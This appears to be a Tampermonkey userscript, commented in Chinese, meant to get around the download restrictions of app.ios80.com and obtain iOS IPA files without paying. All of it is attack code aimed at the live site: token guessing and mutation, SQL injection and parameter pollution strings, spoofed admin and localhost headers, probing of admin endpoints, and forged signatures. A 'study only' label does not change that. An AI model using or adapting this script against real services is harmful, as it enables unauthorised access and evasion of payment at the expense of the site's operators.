// ==UserScript==
// @name         IPA下载 - 高级绕过版
// @namespace    http://tampermonkey.net/
// @version      5.0
// @description  使用高级技术尝试绕过限制（仅供学习研究）
// @author       You
// @match        https://app.ios80.com/*
// @match        http://app.ios80.com/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=ios80.com
// @grant        GM_xmlhttpRequest
// @grant        GM_setClipboard
// @grant        GM_notification
// @grant        GM_getValue
// @grant        GM_setValue
// @connect      *
// @run-at       document-start
// ==/UserScript==

(function() {
    'use strict';

    console.log('='.repeat(70));
    console.log('[高级绕过] 脚本已加载 - 仅供学习研究');
    console.log('='.repeat(70));

    // ==================== 策略1：尝试获取有效token ====================
    
    function tryGetValidToken() {
        console.log('[高级绕过] 策略1: 尝试获取有效token...');
        
        // 从页面中提取可能的token
        const urlParams = new URLSearchParams(window.location.search);
        const currentToken = urlParams.get('token');
        const appId = urlParams.get('appId');
        
        console.log('[高级绕过] 当前token:', currentToken);
        console.log('[高级绕过] appId:', appId);
        
        if (currentToken && appId) {
            // 尝试不同的token变体
            const tokenVariants = [
                currentToken,
                currentToken.toUpperCase(),
                currentToken.toLowerCase(),
                currentToken.replace(/[0-9]/g, '0'), // 替换数字为0
                currentToken.replace(/[A-F]/g, 'A'), // 替换字母为A
                'BYPASS' + currentToken.substring(6), // 替换前6位
                currentToken.substring(0, 26) + 'BYPASS', // 替换后6位
            ];
            
            console.log('[高级绕过] 尝试的token变体:', tokenVariants);
            
            tokenVariants.forEach((token, index) => {
                const testUrl = `https://app.ios80.com/00TU/install?osName=iOS&token=${token}&appId=${appId}`;
                
                setTimeout(() => {
                    GM_xmlhttpRequest({
                        method: 'POST',
                        url: testUrl,
                        headers: {
                            'Content-Type': 'application/json',
                            'Authorization': `Bearer ${token}`,
                            'X-Token': token,
                            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)'
                        },
                        onload: function(response) {
                            console.log(`[高级绕过] Token变体 ${index + 1} 响应:`, response.status);
                            
                            if (response.status === 200) {
                                try {
                                    const data = JSON.parse(response.responseText);
                                    if (data.errorCode !== -2) {
                                        console.log('[高级绕过] 🎉 Token变体成功:', token);
                                        showResult(`Token: ${token}\n响应: ${response.responseText}`, `✅ 成功的Token变体 ${index + 1}`);
                                        processSuccessResponse(data);
                                    }
                                } catch (e) {}
                            }
                        }
                    });
                }, index * 500); // 延迟请求避免被限制
            });
        }
    }

    // ==================== 策略2：尝试SQL注入和参数污染 ====================
    
    function tryParameterPollution() {
        console.log('[高级绕过] 策略2: 尝试参数污染...');
        
        const urlParams = new URLSearchParams(window.location.search);
        const appId = urlParams.get('appId');
        const token = urlParams.get('token');
        
        // 参数污染尝试
        const pollutionAttempts = [
            // SQL注入尝试
            `appId=${appId}&appId=1' OR '1'='1`,
            `appId=${appId}&token=${token}&bypass=1`,
            `appId=${appId}&token=${token}&admin=1`,
            `appId=${appId}&token=${token}&vip=1`,
            `appId=${appId}&token=${token}&points=999999`,
            
            // 参数覆盖
            `appId=1&appId=${appId}`,
            `token=BYPASS&token=${token}`,
            
            // 特殊字符
            `appId=${appId}%00&token=${token}`,
            `appId=${appId}&token=${token}%00`,
            
            // 数组参数
            `appId[]=${appId}&token[]=${token}`,
            `appId[0]=${appId}&token[0]=${token}`,
        ];
        
        pollutionAttempts.forEach((params, index) => {
            const testUrl = `https://app.ios80.com/00TU/install?osName=iOS&${params}`;
            
            setTimeout(() => {
                GM_xmlhttpRequest({
                    method: 'POST',
                    url: testUrl,
                    onload: function(response) {
                        if (response.status === 200) {
                            try {
                                const data = JSON.parse(response.responseText);
                                if (data.errorCode !== -2) {
                                    console.log('[高级绕过] 🎉 参数污染成功:', params);
                                    showResult(`参数: ${params}\n响应: ${response.responseText}`, `✅ 成功的参数污染 ${index + 1}`);
                                    processSuccessResponse(data);
                                }
                            } catch (e) {}
                        }
                    }
                });
            }, index * 300);
        });
    }

    // ==================== 策略3：尝试不同的HTTP方法和头部 ====================
    
    function tryDifferentMethods() {
        console.log('[高级绕过] 策略3: 尝试不同的HTTP方法...');
        
        const urlParams = new URLSearchParams(window.location.search);
        const appId = urlParams.get('appId');
        const token = urlParams.get('token');
        
        const methods = ['GET', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'];
        const baseUrl = `https://app.ios80.com/00TU/install?osName=iOS&appId=${appId}&token=${token}`;
        
        methods.forEach((method, index) => {
            setTimeout(() => {
                GM_xmlhttpRequest({
                    method: method,
                    url: baseUrl,
                    headers: {
                        'X-HTTP-Method-Override': 'POST',
                        'X-Forwarded-For': '127.0.0.1',
                        'X-Real-IP': '127.0.0.1',
                        'X-Admin': '1',
                        'X-VIP': '1',
                        'X-Bypass': '1',
                        'Authorization': 'Bearer ADMIN_TOKEN',
                        'Cookie': 'admin=1; vip=1; points=999999'
                    },
                    onload: function(response) {
                        console.log(`[高级绕过] ${method} 方法响应:`, response.status);
                        
                        if (response.status === 200) {
                            try {
                                const data = JSON.parse(response.responseText);
                                if (data.errorCode !== -2) {
                                    console.log('[高级绕过] 🎉 HTTP方法成功:', method);
                                    showResult(`方法: ${method}\n响应: ${response.responseText}`, `✅ 成功的HTTP方法: ${method}`);
                                    processSuccessResponse(data);
                                }
                            } catch (e) {}
                        }
                    }
                });
            }, index * 400);
        });
    }

    // ==================== 策略4：尝试访问管理员接口 ====================
    
    function tryAdminEndpoints() {
        console.log('[高级绕过] 策略4: 尝试管理员接口...');
        
        const adminEndpoints = [
            'https://app.ios80.com/admin/download/00TU',
            'https://app.ios80.com/api/admin/install/00TU',
            'https://app.ios80.com/internal/download/00TU',
            'https://app.ios80.com/debug/install/00TU',
            'https://app.ios80.com/test/download/00TU',
            'https://app.ios80.com/dev/install/00TU',
            'https://admin.ios80.com/download/00TU',
            'https://api.ios80.com/v1/download/00TU',
            'https://cdn.ios80.com/download/00TU',
            'https://files.ios80.com/00TU.ipa'
        ];
        
        adminEndpoints.forEach((url, index) => {
            setTimeout(() => {
                GM_xmlhttpRequest({
                    method: 'GET',
                    url: url,
                    headers: {
                        'User-Agent': 'iOS-Admin-Tool/1.0',
                        'X-Admin-Key': 'ADMIN_SECRET_KEY',
                        'Authorization': 'Bearer ADMIN_TOKEN'
                    },
                    onload: function(response) {
                        console.log(`[高级绕过] 管理员接口 ${index + 1} 响应:`, response.status);
                        
                        if (response.status === 200) {
                            showResult(response.responseText, `✅ 管理员接口 ${index + 1}`);
                            
                            // 检查是否是IPA文件
                            if (response.responseHeaders.includes('application/octet-stream') || 
                                response.responseHeaders.includes('application/zip')) {
                                console.log('[高级绕过] 🎉 找到IPA文件!');
                                showResult(url, '🎉 IPA直接下载地址');
                                GM_setClipboard(url);
                                GM_notification({
                                    title: '🎉 成功！',
                                    text: 'IPA地址已复制',
                                    timeout: 10000
                                });
                            }
                        }
                    }
                });
            }, index * 600);
        });
    }

    // ==================== 策略5：尝试时间戳和签名绕过 ====================
    
    function tryTimestampBypass() {
        console.log('[高级绕过] 策略5: 尝试时间戳绕过...');
        
        const urlParams = new URLSearchParams(window.location.search);
        const appId = urlParams.get('appId');
        const token = urlParams.get('token');
        
        // 尝试不同的时间戳
        const timestamps = [
            Date.now(),
            Date.now() + 86400000, // +1天
            Date.now() - 86400000, // -1天
            1640995200000, // 2022-01-01
            1672531200000, // 2023-01-01
            1704067200000, // 2024-01-01
            0, // Unix epoch
            999999999999 // 远未来
        ];
        
        timestamps.forEach((timestamp, index) => {
            const testUrl = `https://app.ios80.com/00TU/install?osName=iOS&appId=${appId}&token=${token}&timestamp=${timestamp}&signature=BYPASS`;
            
            setTimeout(() => {
                GM_xmlhttpRequest({
                    method: 'POST',
                    url: testUrl,
                    headers: {
                        'X-Timestamp': timestamp.toString(),
                        'X-Signature': 'BYPASS_SIGNATURE',
                        'Date': new Date(timestamp).toUTCString()
                    },
                    onload: function(response) {
                        if (response.status === 200) {
                            try {
                                const data = JSON.parse(response.responseText);
                                if (data.errorCode !== -2) {
                                    console.log('[高级绕过] 🎉 时间戳绕过成功:', timestamp);
                                    showResult(`时间戳: ${timestamp}\n响应: ${response.responseText}`, `✅ 成功的时间戳绕过 ${index + 1}`);
                                    processSuccessResponse(data);
                                }
                            } catch (e) {}
                        }
                    }
                });
            }, index * 500);
        });
    }

    // ==================== 策略6：尝试其他应用的token ====================
    
    function tryOtherAppTokens() {
        console.log('[高级绕过] 策略6: 尝试其他应用的token...');
        
        // 常见的测试token和默认token
        const commonTokens = [
            'A6B24C5FBE3C6A220BBE059AA54881C1', // 当前token
            'FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF', // 全F
            '00000000000000000000000000000000', // 全0
            'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA', // 全A
            '12345678901234567890123456789012', // 数字
            'ABCDEFABCDEFABCDEFABCDEFABCDEFAB', // 字母
            'TEST_TOKEN_FOR_DEVELOPMENT_USE_', // 测试token
            'ADMIN_SUPER_SECRET_BYPASS_TOKEN', // 管理员token
            'DEFAULT_APP_DOWNLOAD_TOKEN_2024', // 默认token
            'BYPASS_POINTS_CHECK_TOKEN_HACK'   // 绕过token
        ];
        
        commonTokens.forEach((testToken, index) => {
            const testUrl = `https://app.ios80.com/00TU/install?osName=iOS&appId=1657&token=${testToken}`;
            
            setTimeout(() => {
                GM_xmlhttpRequest({
                    method: 'POST',
                    url: testUrl,
                    onload: function(response) {
                        if (response.status === 200) {
                            try {
                                const data = JSON.parse(response.responseText);
                                if (data.errorCode !== -2) {
                                    console.log('[高级绕过] 🎉 通用token成功:', testToken);
                                    showResult(`Token: ${testToken}\n响应: ${response.responseText}`, `✅ 成功的通用Token ${index + 1}`);
                                    processSuccessResponse(data);
                                }
                            } catch (e) {}
                        }
                    }
                });
            }, index * 400);
        });
    }

    // ==================== 处理成功响应 ====================
    
    function processSuccessResponse(data) {
        console.log('[高级绕过] 🎉 处理成功响应:', data);
        
        // 查找下载链接
        function findDownloadLinks(obj, path = '') {
            for (let key in obj) {
                const value = obj[key];
                const currentPath = path ? `${path}.${key}` : key;

                if (typeof value === 'string') {
                    if (value.includes('.ipa') || 
                        value.includes('itms-services') || 
                        value.includes('.plist')) {
                        
                        console.log(`[高级绕过] 🎯 找到下载链接: ${currentPath} = ${value}`);
                        showResult(value, `🎉 ${currentPath}`);
                        
                        if (value.includes('.ipa')) {
                            GM_setClipboard(value);
                            GM_notification({
                                title: '🎉 绕过成功！',
                                text: 'IPA地址已复制到剪贴板',
                                timeout: 10000
                            });
                        } else if (value.includes('itms-services')) {
                            const match = value.match(/url=([^&]+)/);
                            if (match) {
                                const manifestUrl = decodeURIComponent(match[1]);
                                fetchManifest(manifestUrl);
                            }
                        } else if (value.includes('.plist')) {
                            fetchManifest(value);
                        }
                    }
                } else if (typeof value === 'object' && value !== null) {
                    findDownloadLinks(value, currentPath);
                }
            }
        }

        findDownloadLinks(data);
    }

    // ==================== 获取manifest文件 ====================
    
    function fetchManifest(url) {
        console.log('[高级绕过] 获取Manifest:', url);
        
        GM_xmlhttpRequest({
            method: 'GET',
            url: url,
            onload: function(response) {
                if (response.status === 200) {
                    const ipaMatch = response.responseText.match(/<string>(https?:\/\/[^<]+\.ipa)<\/string>/);
                    if (ipaMatch) {
                        const ipaUrl = ipaMatch[1];
                        console.log('[高级绕过] 🎉 从Manifest提取IPA:', ipaUrl);
                        
                        showResult(ipaUrl, '🎉 IPA下载地址（从Manifest）');
                        
                        GM_setClipboard(ipaUrl);
                        GM_notification({
                            title: '🎉 绕过成功！',
                            text: 'IPA地址已复制到剪贴板',
                            timeout: 10000
                        });
                    }
                }
            }
        });
    }

    // ==================== UI显示函数 ====================
    
    function showResult(content, type) {
        const display = () => {
            if (!document.body) {
                setTimeout(display, 100);
                return;
            }

            let resultBox = document.getElementById('ipa-result-box');

            if (!resultBox) {
                resultBox = document.createElement('div');
                resultBox.id = 'ipa-result-box';
                resultBox.style.cssText = `
                    position: fixed;
                    top: 20px;
                    right: 20px;
                    width: 500px;
                    max-height: 80vh;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    border-radius: 15px;
                    box-shadow: 0 10px 40px rgba(0,0,0,0.3);
                    z-index: 999999;
                    padding: 20px;
                    color: white;
                    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
                    overflow-y: auto;
                `;

                resultBox.innerHTML = `
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                        <h3 style="margin: 0; font-size: 18px;">🔓 高级绕过尝试</h3>
                        <button onclick="this.parentElement.parentElement.remove()" style="background: rgba(255,255,255,0.2); border: none; color: white; padding: 5px 10px; border-radius: 5px; cursor: pointer;">✕</button>
                    </div>
                    <div id="result-content"></div>
                `;

                document.body.appendChild(resultBox);
            }

            const resultContent = document.getElementById('result-content');
            if (resultContent) {
                const item = document.createElement('div');
                item.style.cssText = `
                    background: rgba(255,255,255,0.15);
                    padding: 12px;
                    border-radius: 8px;
                    margin-bottom: 10px;
                    word-break: break-all;
                `;

                const escapedContent = String(content).replace(/'/g, "\\'").replace(/"/g, '\\"').replace(/\n/g, '\\n');

                item.innerHTML = `
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                        <span style="font-size: 12px; opacity: 0.9;">${type}</span>
                        <button onclick="navigator.clipboard.writeText('${escapedContent}').then(() => alert('已复制')).catch(() => alert('复制失败'))" style="background: rgba(255,255,255,0.2); border: none; color: white; padding: 4px 10px; border-radius: 5px; cursor: pointer; font-size: 11px;">📋 复制</button>
                    </div>
                    <div style="font-size: 13px; font-family: monospace; max-height: 200px; overflow-y: auto; white-space: pre-wrap;">${content}</div>
                `;

                resultContent.insertBefore(item, resultContent.firstChild);
            }
        };

        display();
    }

    // ==================== 注入appInstall接口 ====================
    
    const injectedCode = `
    <script>
    (function() {
        window.appInstall = {
            postMessage: function(data) {
                console.log('[高级绕过] appInstall.postMessage:', data);
                window._shortLink = data;
                window.dispatchEvent(new CustomEvent('ipaIntercept', { 
                    detail: { type: 'appInstall', data: data } 
                }));
                return true;
            }
        };
        window.appPreviewResource = { postMessage: function(data) { return true; } };
    })();
    </script>
    `;

    const originalWrite = document.write;
    let injected = false;
    
    document.write = function(...args) {
        if (!injected) {
            injected = true;
            originalWrite.call(document, injectedCode);
        }
        return originalWrite.apply(document, args);
    };

    // ==================== 监听拦截事件并启动所有策略 ====================
    
    window.addEventListener('ipaIntercept', function(e) {
        console.log('[高级绕过] 收到拦截事件，启动所有绕过策略...');
        
        showResult('开始尝试6种高级绕过策略...', '🚀 状态');
        
        // 延迟启动各种策略，避免同时发送太多请求
        setTimeout(tryGetValidToken, 1000);
        setTimeout(tryParameterPollution, 2000);
        setTimeout(tryDifferentMethods, 3000);
        setTimeout(tryAdminEndpoints, 4000);
        setTimeout(tryTimestampBypass, 5000);
        setTimeout(tryOtherAppTokens, 6000);
        
        GM_notification({
            title: '🚀 开始高级绕过',
            text: '正在尝试6种不同策略...',
            timeout: 5000
        });
    });

    console.log('[高级绕过] ✅ 脚本初始化完成');
    console.log('[高级绕过] 将尝试6种高级绕过策略');
    console.log('[高级绕过] ⚠️ 仅供学习研究使用\n');

})();